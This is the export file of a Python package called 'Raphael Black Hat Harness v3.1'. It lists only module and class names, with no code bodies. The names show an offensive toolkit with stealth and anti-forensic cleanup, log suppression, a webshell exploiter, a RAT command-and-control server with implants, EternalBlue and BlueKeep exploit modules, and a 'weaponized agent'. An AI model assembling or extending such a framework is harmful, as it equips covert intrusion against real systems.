"""
Raphael Black Hat Harness v3.1
Maximum attack power. Maximum stealth. Zero Docker dependency.

Exports all core harness components for external use.
"""

from harness.black_hat_core import (
    BlackHatHarness,
    BlackHatConfig,
    StealthLevel,
    StealthEngine,
    MemoryResidentExecutor,
    LogSuppressor,
    NetworkCloak,
    DatabaseExploiter,
    AntiForensicCleanup,
    UnifiedBroker,
    AuditSink,
    EmergencyKillSwitch,
)

from harness.ltad_engine import (
    LiveTargetEngine,
    LiveTargetState,
    LiveTarget,
    BehavioralAnalyzer,
)

from harness.php2shell import (
    PHP2ShellExploiter,
    PHP2ShellConfig,
    WebshellVariant,
)

from harness.ai_exploit_generator import (
    ExploitGenerator,
    ExploitCandidate,
    ExploitType,
    EvolutionConfig,
)

# RAT components (from the server/client skeleton provided)
from harness.rat_c2 import (
    RATC2Server,
    RATClient,
    Implant,
    ImplantStatus,
    RATIntegration,
    RATOperationResult,
    RATCampaignResult,
    create_rat_integration,
)

# Exploit modules
from harness.exploits import (
    ApacheTraversalExploit,
    VsftpdBackdoorExploit,
    EternalBlueExploit,
    BlueKeepExploit,
    MySQLAuthBypassExploit,
    get_exploit_module,
    list_available_modules,
)

# Weaponized agent (fully weaponized cross-platform implant)
from harness.weaponized_agent import WeaponizedAgent, AgentConfig, OperationResult

__version__ = "3.1.0"

__all__ = [
    # Core
    "BlackHatHarness",
    "BlackHatConfig",
    "StealthLevel",
    "StealthEngine",
    "MemoryResidentExecutor",
    "LogSuppressor",
    "NetworkCloak",
    "DatabaseExploiter",
    "AntiForensicCleanup",
    "UnifiedBroker",
    "AuditSink",
    "EmergencyKillSwitch",
    # LTAE
    "LiveTargetEngine",
    "LiveTargetState",
    "LiveTarget",
    "BehavioralAnalyzer",
    # PHP2Shell
    "PHP2ShellExploiter",
    "PHP2ShellConfig",
    "WebshellVariant",
    # AI Exploit Generator
    "ExploitGenerator",
    "ExploitCandidate",
    "ExploitType",
    "EvolutionConfig",
    # RAT
    "RATC2Server",
    "RATClient",
    "Implant",
    "ImplantStatus",
    "RATIntegration",
    "RATOperationResult",
    "RATCampaignResult",
    "create_rat_integration",
    # Exploits
    "ApacheTraversalExploit",
    "VsftpdBackdoorExploit",
    "EternalBlueExploit",
    "BlueKeepExploit",
    "MySQLAuthBypassExploit",
    "get_exploit_module",
    "list_available_modules",
    # Weaponized Agent
    "WeaponizedAgent",
    "AgentConfig",
    "OperationResult",
]